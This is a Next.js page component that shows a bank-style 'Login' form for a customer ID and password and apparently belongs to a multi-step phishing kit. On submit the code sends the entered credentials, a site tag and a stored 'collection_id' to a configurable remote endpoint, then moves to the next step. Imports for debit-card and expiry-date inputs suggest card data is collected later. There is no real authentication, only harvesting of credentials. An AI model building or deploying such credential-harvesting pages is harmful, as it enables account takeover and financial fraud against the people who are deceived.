'use client';
import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";
import { useEffect } from "react";  
import styles from '../MyStyleForm.module.css';


export default function Home() {
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;

    const handleSubmit = async (e) => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        jsonObject1['id'] = localStorage.getItem("collection_id");
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            router.push('/3');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }
    };
  return (
    <>
    <Header />
    <h5 className={`${styles.Centering} mb-0 mt-4`}>Login</h5>
    <div className={styles.formContainer}>
      <form onSubmit={handleSubmit} >
        <div className={styles.inputGroup}>
          <input type="text" name="custid" minLength={9} maxLength={9}  required placeholder=" " />
          <label>Customer Id</label>
        </div>
        <div className={styles.inputGroup}>
          <input type="password"  name="pass" required placeholder=" " />
          <label>Password</label>
        </div>
        <button type="submit"  className={styles.button}>
          Login
        </button>
        
        <div className={styles.assistanceLink}>
            <a>Use Customer Id or Login ID</a>
        </div>
        <a href="#" className={styles.assistanceLink}>
          Need assistance activating mobile banking
        </a>
      </form>
    </div>
    <Footer />
</>
  );
}
